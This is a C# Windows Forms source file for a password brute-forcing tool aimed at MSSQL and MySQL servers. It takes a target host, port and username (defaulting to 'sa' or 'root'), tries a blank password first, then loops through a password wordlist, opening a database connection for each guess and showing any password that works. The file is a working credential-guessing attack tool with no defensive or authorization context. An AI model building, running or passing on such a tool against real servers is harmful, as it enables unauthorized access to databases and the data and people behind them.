using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using System.Data.SqlClient;
using System.Data.OleDb;
using System.IO;
using MySql.Data;
using MySql.Data.MySqlClient;

namespace MySlide
{
	public class MySlideForm : SlideDialog.SlideDialog
	{
		internal static string SQL_CONN_STRING = string.Empty;
		internal static string MYSQL_CONN_STRING = string.Empty;
		private System.Windows.Forms.TextBox txtTargetBrute;
		private System.Windows.Forms.Label lblHost;
		private System.Windows.Forms.TextBox txtUserBrute;
		private System.Windows.Forms.TextBox txtPasswordBrute;
		private DotNetSkin.SkinControls.SkinButton btnPasswordlist;
		private DotNetSkin.SkinControls.SkinButtonGreen btnStartBrute;
		private System.Windows.Forms.TextBox txtPasswordIs;
		private System.Windows.Forms.Label lblPasswordIs;
		private System.Windows.Forms.OpenFileDialog openFileDialog1;
		private System.Windows.Forms.Label label1;
		private System.Windows.Forms.Label label2;
		private System.Windows.Forms.Label label3;
		public System.Windows.Forms.TextBox txtPortBrute;
		public System.Windows.Forms.StatusBar stsBrute;
		public DotNetSkin.SkinControls.SkinCheckBox chkboxDebug;
		private DotNetSkin.SkinControls.SkinRadioButton chkboxmssql;
		private DotNetSkin.SkinControls.SkinRadioButton chkboxmysql;
		private DotNetSkin.SkinControls.SkinButtonRed btnStopit;
		private System.ComponentModel.IContainer components = null;

		bool stopit=false;
		string mySqlConnectionString;
		MySqlConnection mySqlConnection;
		private System.Windows.Forms.Panel panel1;
		private System.Windows.Forms.Panel panel2;
		private System.Windows.Forms.RichTextBox txtboxDebug;
		bool connected = false;

		public MySlideForm(Form poOwner, float pfStep) : base(poOwner, pfStep)
		{
			InitializeComponent();
		}
		
		//Pickup the params from the main form
		public string _textBox
		{
			set{txtTargetBrute.Text=value;}
		} 
		public string _textBox2
		{
			set{txtPortBrute.Text=value;}
		} 
		public string _textBox3
		{
			set{txtUserBrute.Text=value;}
		} 
		//

		protected override void Dispose( bool disposing )
		{
			if( disposing )
			{
				if (components != null) 
				{
					components.Dispose();
				}
			}
			base.Dispose( disposing );
		}

		#region Designer generated code

		private void InitializeComponent()
		{
			this.txtTargetBrute = new System.Windows.Forms.TextBox();
			this.lblHost = new System.Windows.Forms.Label();
			this.txtUserBrute = new System.Windows.Forms.TextBox();
			this.txtPasswordBrute = new System.Windows.Forms.TextBox();
			this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
			this.btnPasswordlist = new DotNetSkin.SkinControls.SkinButton();
			this.btnStartBrute = new DotNetSkin.SkinControls.SkinButtonGreen();
			this.txtPasswordIs = new System.Windows.Forms.TextBox();
			this.lblPasswordIs = new System.Windows.Forms.Label();
			this.label1 = new System.Windows.Forms.Label();
			this.label2 = new System.Windows.Forms.Label();
			this.label3 = new System.Windows.Forms.Label();
			this.txtPortBrute = new System.Windows.Forms.TextBox();
			this.stsBrute = new System.Windows.Forms.StatusBar();
			this.chkboxDebug = new DotNetSkin.SkinControls.SkinCheckBox();
			this.chkboxmssql = new DotNetSkin.SkinControls.SkinRadioButton();
			this.chkboxmysql = new DotNetSkin.SkinControls.SkinRadioButton();
			this.btnStopit = new DotNetSkin.SkinControls.SkinButtonRed();
			this.panel1 = new System.Windows.Forms.Panel();
			this.panel2 = new System.Windows.Forms.Panel();
			this.txtboxDebug = new System.Windows.Forms.RichTextBox();
			this.panel1.SuspendLayout();
			this.panel2.SuspendLayout();
			this.SuspendLayout();
			// 
			// txtTargetBrute
			// 
			this.txtTargetBrute.Location = new System.Drawing.Point(90, 12);
			this.txtTargetBrute.Name = "txtTargetBrute";
			this.txtTargetBrute.Size = new System.Drawing.Size(144, 18);
			this.txtTargetBrute.TabIndex = 5;
			this.txtTargetBrute.Text = "";
			// 
			// lblHost
			// 
			this.lblHost.Location = new System.Drawing.Point(48, 12);
			this.lblHost.Name = "lblHost";
			this.lblHost.Size = new System.Drawing.Size(34, 14);
			this.lblHost.TabIndex = 4;
			this.lblHost.Text = "Target";
			// 
			// txtUserBrute
			// 
			this.txtUserBrute.Location = new System.Drawing.Point(90, 40);
			this.txtUserBrute.Name = "txtUserBrute";
			this.txtUserBrute.Size = new System.Drawing.Size(144, 18);
			this.txtUserBrute.TabIndex = 6;
			this.txtUserBrute.Text = "admin";
			// 
			// txtPasswordBrute
			// 
			this.txtPasswordBrute.Location = new System.Drawing.Point(90, 68);
			this.txtPasswordBrute.Name = "txtPasswordBrute";
			this.txtPasswordBrute.Size = new System.Drawing.Size(144, 18);
			this.txtPasswordBrute.TabIndex = 7;
			this.txtPasswordBrute.Text = "";
			// 
			// btnPasswordlist
			// 
			this.btnPasswordlist.Location = new System.Drawing.Point(238, 68);
			this.btnPasswordlist.Name = "btnPasswordlist";
			this.btnPasswordlist.Size = new System.Drawing.Size(88, 20);
			this.btnPasswordlist.TabIndex = 10;
			this.btnPasswordlist.Text = "File Locate";
			this.btnPasswordlist.Click += new System.EventHandler(this.btnPasswordlist_Click);
			// 
			// btnStartBrute
			// 
			this.btnStartBrute.Location = new System.Drawing.Point(12, 154);
			this.btnStartBrute.Name = "btnStartBrute";
			this.btnStartBrute.Size = new System.Drawing.Size(318, 20);
			this.btnStartBrute.TabIndex = 11;
			this.btnStartBrute.Text = "Start";
			this.btnStartBrute.Click += new System.EventHandler(this.btnStartBrute_Click_1);
			// 
			// txtPasswordIs
			// 
			this.txtPasswordIs.Location = new System.Drawing.Point(90, 126);
			this.txtPasswordIs.Name = "txtPasswordIs";
			this.txtPasswordIs.ReadOnly = true;
			this.txtPasswordIs.Size = new System.Drawing.Size(144, 18);
			this.txtPasswordIs.TabIndex = 12;
			this.txtPasswordIs.Text = "";
			// 
			// lblPasswordIs
			// 
			this.lblPasswordIs.Location = new System.Drawing.Point(18, 128);
			this.lblPasswordIs.Name = "lblPasswordIs";
			this.lblPasswordIs.Size = new System.Drawing.Size(64, 16);
			this.lblPasswordIs.TabIndex = 13;
			this.lblPasswordIs.Text = "Password is:";
			// 
			// label1
			// 
			this.label1.Location = new System.Drawing.Point(30, 42);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(52, 14);
			this.label1.TabIndex = 15;
			this.label1.Text = "Username";
			// 
			// label2
			// 
			this.label2.Location = new System.Drawing.Point(12, 68);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(70, 14);
			this.label2.TabIndex = 16;
			this.label2.Text = "Password File";
			// 
			// label3
			// 
			this.label3.Location = new System.Drawing.Point(58, 96);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(24, 14);
			this.label3.TabIndex = 17;
			this.label3.Text = "Port";
			// 
			// txtPortBrute
			// 
			this.txtPortBrute.Location = new System.Drawing.Point(90, 94);
			this.txtPortBrute.Name = "txtPortBrute";
			this.txtPortBrute.Size = new System.Drawing.Size(144, 18);
			this.txtPortBrute.TabIndex = 18;
			this.txtPortBrute.Text = "1433";
			// 
			// stsBrute
			// 
			this.stsBrute.Location = new System.Drawing.Point(0, 530);
			this.stsBrute.Name = "stsBrute";
			this.stsBrute.Size = new System.Drawing.Size(332, 22);
			this.stsBrute.TabIndex = 19;
			this.stsBrute.Text = "Brute force status";
			// 
			// chkboxDebug
			// 
			this.chkboxDebug.BackColor = System.Drawing.Color.Transparent;
			this.chkboxDebug.Location = new System.Drawing.Point(244, 96);
			this.chkboxDebug.Name = "chkboxDebug";
			this.chkboxDebug.Size = new System.Drawing.Size(86, 18);
			this.chkboxDebug.TabIndex = 21;
			this.chkboxDebug.Text = "Show debug";
			// 
			// chkboxmssql
			// 
			this.chkboxmssql.BackColor = System.Drawing.Color.Transparent;
			this.chkboxmssql.Checked = true;
			this.chkboxmssql.Location = new System.Drawing.Point(244, 16);
			this.chkboxmssql.Name = "chkboxmssql";
			this.chkboxmssql.Size = new System.Drawing.Size(64, 14);
			this.chkboxmssql.TabIndex = 22;
			this.chkboxmssql.TabStop = true;
			this.chkboxmssql.Text = "MSSQL";
			this.chkboxmssql.CheckedChanged += new System.EventHandler(this.chkboxmssql_CheckedChanged);
			// 
			// chkboxmysql
			// 
			this.chkboxmysql.BackColor = System.Drawing.Color.Transparent;
			this.chkboxmysql.Location = new System.Drawing.Point(244, 40);
			this.chkboxmysql.Name = "chkboxmysql";
			this.chkboxmysql.Size = new System.Drawing.Size(64, 16);
			this.chkboxmysql.TabIndex = 23;
			this.chkboxmysql.Text = "MySQL";
			// 
			// btnStopit
			// 
			this.btnStopit.Location = new System.Drawing.Point(12, 178);
			this.btnStopit.Name = "btnStopit";
			this.btnStopit.Size = new System.Drawing.Size(318, 20);
			this.btnStopit.TabIndex = 24;
			this.btnStopit.Text = "Stop";
			this.btnStopit.Click += new System.EventHandler(this.skinButtonRed1_Click);
			// 
			// panel1
			// 
			this.panel1.BackColor = System.Drawing.Color.Silver;
			this.panel1.Controls.Add(this.btnPasswordlist);
			this.panel1.Controls.Add(this.txtUserBrute);
			this.panel1.Controls.Add(this.txtPasswordBrute);
			this.panel1.Controls.Add(this.btnStopit);
			this.panel1.Controls.Add(this.chkboxmysql);
			this.panel1.Controls.Add(this.chkboxmssql);
			this.panel1.Controls.Add(this.chkboxDebug);
			this.panel1.Controls.Add(this.lblHost);
			this.panel1.Controls.Add(this.label3);
			this.panel1.Controls.Add(this.txtPortBrute);
			this.panel1.Controls.Add(this.txtTargetBrute);
			this.panel1.Controls.Add(this.label2);
			this.panel1.Controls.Add(this.label1);
			this.panel1.Controls.Add(this.lblPasswordIs);
			this.panel1.Controls.Add(this.txtPasswordIs);
			this.panel1.Controls.Add(this.btnStartBrute);
			this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
			this.panel1.Location = new System.Drawing.Point(0, 316);
			this.panel1.Name = "panel1";
			this.panel1.Size = new System.Drawing.Size(332, 214);
			this.panel1.TabIndex = 25;
			// 
			// panel2
			// 
			this.panel2.Controls.Add(this.txtboxDebug);
			this.panel2.Dock = System.Windows.Forms.DockStyle.Fill;
			this.panel2.Location = new System.Drawing.Point(0, 0);
			this.panel2.Name = "panel2";
			this.panel2.Size = new System.Drawing.Size(332, 316);
			this.panel2.TabIndex = 26;
			// 
			// txtboxDebug
			// 
			this.txtboxDebug.Dock = System.Windows.Forms.DockStyle.Fill;
			this.txtboxDebug.Location = new System.Drawing.Point(0, 0);
			this.txtboxDebug.Name = "txtboxDebug";
			this.txtboxDebug.Size = new System.Drawing.Size(332, 316);
			this.txtboxDebug.TabIndex = 0;
			this.txtboxDebug.Text = "";
			// 
			// MySlideForm
			// 
			this.AutoScaleBaseSize = new System.Drawing.Size(5, 11);
			this.ClientSize = new System.Drawing.Size(332, 552);
			this.Controls.Add(this.panel2);
			this.Controls.Add(this.panel1);
			this.Controls.Add(this.stsBrute);
			this.Font = new System.Drawing.Font("MS Reference Sans Serif", 6.75F);
			this.Name = "MySlideForm";
			this.panel1.ResumeLayout(false);
			this.panel2.ResumeLayout(false);
			this.ResumeLayout(false);

		}
		#endregion

		#region Boring Stuff
		private void btnPasswordlist_Click(object sender, System.EventArgs e)
		{
			if (this.openFileDialog1.ShowDialog() == DialogResult.OK)
			{
				txtPasswordBrute.Text = this.openFileDialog1.FileName;
			}

		}
		
		public void StartThreadMan()
		{
			StartTaskMan del= new StartTaskMan(CreateConnectionString1);
			AsyncCallback callBackWhenDone = new AsyncCallback(this.EndStartThreadMan);
			del.BeginInvoke(callBackWhenDone,null);
			
		}
		
		public void EndStartThreadMan(IAsyncResult arResult) 
		{

		}
		
		private void UpdateUI() 
		{
			
		}
		#endregion
				
		#region Attempt First Blank Logins
		
		public delegate bool StartTaskMan();
		private bool CreateConnectionString1()
		{
			SqlConnection connection = null;
			MySqlConnection myconnection = null;
			int count=0;
			try
			{
				//Reading in the Password.txt File
				StreamReader s = File.OpenText(txtPasswordBrute.Text);
				string line	= null;	
			{
				if (chkboxmssql.Checked)
				{
					///Tries a blank password first
					System.Text.StringBuilder sb1 = new System.Text.StringBuilder();
					sb1.AppendFormat("data source={0},{3};integrated security=false;persist security info=True;User ID={1};Password=", new object[]{this.txtTargetBrute.Text, this.txtUserBrute.Text, line, txtPortBrute.Text/*this.txtBoxPasswdLst.Text*/});
					//sb1.AppendFormat("server={0},{3}, User ID={1};Password='{2}'", new object[]{this.txtTargetBrute.Text, this.txtUserBrute.Text, null, this.txtPortBrute.Text/*this.txtBoxPasswdLst.Text*/});
					SQL_CONN_STRING = sb1.ToString();
					connection = GetConnection(SQL_CONN_STRING);
				}
				else if (chkboxmysql.Checked)
				{
					///Tries a blank password first
					System.Text.StringBuilder sb2 = new System.Text.StringBuilder();
					sb2.AppendFormat( "server={0};user id={1}; port={3}; pooling=false; password={2}", new object[]{this.txtTargetBrute.Text, this.txtUserBrute.Text, null,this.txtPortBrute.Text});
					MYSQL_CONN_STRING = sb2.ToString();
					myconnection = GetMySqlConnection(MYSQL_CONN_STRING);

				}
				
				if (chkboxDebug.Checked)
				{
					txtboxDebug.AppendText("Checking with blank password...\r\n");
				}	
		#endregion

		#region Starts Full Brute Force
				//Now we start with the full bruting
				while ((stopit == false) && (connection == null) && (myconnection == null) && ((line = s.ReadLine()) != null))
				{
					//string[] read	=line.Split(' ');
					if (chkboxmssql.Checked)
					{
						System.Text.StringBuilder sb3 = new System.Text.StringBuilder();
						sb3.AppendFormat("data source={0},{3};integrated security=false;persist security info=True;User ID={1};Password={2}", new object[]{this.txtTargetBrute.Text, this.txtUserBrute.Text, line, txtPortBrute.Text/*this.txtBoxPasswdLst.Text*/});
						SQL_CONN_STRING = sb3.ToString();

						connection = GetConnection(SQL_CONN_STRING);
						count++;
						stsBrute.Text = "Number of Passwords Tested: " +count.ToString();
					}
					else
					{
						System.Text.StringBuilder sb4 = new System.Text.StringBuilder();
						sb4.AppendFormat( "server={0}; user id={1}; port={3}; pooling=false; password={2}", new object[]{this.txtTargetBrute.Text, this.txtUserBrute.Text, line, txtPortBrute.Text});
						MYSQL_CONN_STRING = sb4.ToString();

						myconnection = GetMySqlConnection(MYSQL_CONN_STRING);
						count++;
						stsBrute.Text = "Number of Passwords Tested: " +count.ToString();
					}
					
					if (chkboxDebug.Checked)
					{
						txtboxDebug.AppendText("Checking password  "+ line+"...\r\n");
					}
				}
				
				if (stopit == true)
				{
					stsBrute.Text = "Brute Force Stopped..";
				}
				
				else if (connection == null)
				{
					stsBrute.Text = "";
				}
				
				else
					stsBrute.Text = "We have a password...";
				return true;
			}
			}
			
			catch (System.Exception e)
			{
				MessageBox.Show(e.Message);
				return false;
			}
		}
		#endregion

		#region MSSQL Connection Handle
		//This handles the MSSQL connection
		private SqlConnection GetConnection(string connectionString)
		{
			try
			{
				SqlConnection dbconnection = new SqlConnection(connectionString);
				dbconnection.Open();
				string[] pass = dbconnection.ConnectionString.Split('=');
				
				if (pass[5] == "") {
					txtPasswordIs.BackColor = System.Drawing.Color.GreenYellow;
					txtPasswordIs.Text = "Blank Password";
				}
				
				else {
					txtPasswordIs.BackColor = System.Drawing.Color.GreenYellow;
					txtPasswordIs.Text = pass[5];
				}
				return dbconnection;
			}

			catch (SqlException ex)
			{
				if (ex.Message.StartsWith("SQL Server"))
				{
					MessageBox.Show("Please check that your Host and Port are set Correctly, SQL server also may not be accepting connections...");
					stopit=true;
					return null;
				}	
				
				else 			
				{
					return null;
				}
			}
		}
		#endregion

		#region MySQL Connection Handle
		//This handles the MySQL connection
		private MySqlConnection GetMySqlConnection(string myconnectionString)
		{
			try
			{
				mySqlConnection = new MySqlConnection ( myconnectionString );
				mySqlConnection.Open ();
				string[] pass = myconnectionString.Split('=');
			
				if (pass[5] == "")
				{
					txtPasswordIs.BackColor = System.Drawing.Color.GreenYellow;
					txtPasswordIs.Text = "Blank Password";
				}
				
				else
					txtPasswordIs.BackColor = System.Drawing.Color.GreenYellow;
					txtPasswordIs.Text = pass[5];
				return mySqlConnection;
			}
			catch (MySqlException ex)
			{
				if (ex.Message.StartsWith("Unable to connect to"))
				{
					MessageBox.Show("Please Check Host and Port Set Correctly, SQL server also may not be accepting connections...");
					stopit=true;	
				    return null;
				}
				
				else 
				{
				return null;
				}
			}
		}
		#endregion

#region Minor Buttons and stuff 
		private void btnStartBrute_Click_1(object sender, System.EventArgs e)
		{
			stopit=false;
			txtboxDebug.Text = "";
			stsBrute.Text = "Loading Passwords File...";
			txtPasswordIs.Text = "";
			StartThreadMan();
		}

		private void skinButtonRed1_Click(object sender, System.EventArgs e)
		{
			stopit=true;
			stsBrute.Text = "Brute Force Stopped...";
		}

		private void chkboxmssql_CheckedChanged(object sender, System.EventArgs e) {
			if (chkboxmysql.Checked){
				txtUserBrute.Text="root";
				txtPortBrute.Text="3306";
			} else {
				txtUserBrute.Text="sa";
				txtPortBrute.Text="1433";
			}
		}

		public MySqlConnection Connection
		{
			get { return mySqlConnection; }
		}

		public bool Connected
		{
			get { return connected; }
		}

		public string ConnectionString
		{
			get { return mySqlConnectionString; }
			set { mySqlConnectionString = value; }
		}
	}
} 
#endregion
